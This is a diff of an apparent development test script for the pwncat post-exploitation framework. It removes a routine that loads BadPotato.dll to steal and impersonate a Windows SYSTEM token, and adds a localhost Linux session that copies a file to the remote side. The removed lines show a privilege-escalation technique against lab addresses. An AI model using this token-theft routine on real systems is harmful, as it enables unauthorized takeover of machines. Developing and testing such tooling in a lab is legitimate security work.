@@ -2,6 +2,7 @@
 import json
 import stat
 import time
+import shutil
 import subprocess
 
 import pwncat.manager
@@ -16,40 +17,14 @@ with pwncat.manager.Manager("data/pwncatrc") as manager:
 
     # Establish a session
     # session = manager.create_session("windows", host="192.168.56.10", port=4444)
-    session = manager.create_session("windows", host="192.168.122.11", port=4444)
+    # session = manager.create_session("windows", host="192.168.122.11", port=4444)
     # session = manager.create_session("linux", host="pwncat-ubuntu", port=4444)
-    # session = manager.create_session("linux", host="127.0.0.1", port=4445)
+    session = manager.create_session("linux", host="127.0.0.1", port=4444)
 
     # session.platform.powershell("amsiutils")
 
-    try:
-        # Load the BadPotato plugin
-        session.log("leaking system token w/ BadPotato")
-        badpotato = session.platform.dotnet_load("BadPotato.dll")
-
-        # Call the method within the DLL to leak a system token
-        system_token = badpotato.get_system_token()
-        session.log(f"found system token: {system_token}")
-        session.log("impersonating token...")
-
-        # Impersonate the SYSTEM token
-        session.platform.impersonate(system_token)
-
-        # Checkout our active user through powershell
-        result = session.platform.powershell(
-            "[System.Security.Principal.WindowsIdentity]::GetCurrent().Name"
-        )
-        session.log(f"now running as: {result[0]}")
-
-        session.platform.refresh_uid()
-
-        session.log(session.platform.getuid())
-        session.log(session.find_user(uid=session.platform.getuid()))
-
-    except (
-        pwncat.platform.windows.ProtocolError,
-        pwncat.platform.windows.PowershellError,
-    ) as exc:
-        session.log(f"badpotato failed: {exc}")
+    with open("/tmp/random", "rb") as source:
+        with session.platform.open("/tmp/random", "wb") as destination:
+            shutil.copyfileobj(source, destination)
 
     manager.interactive()
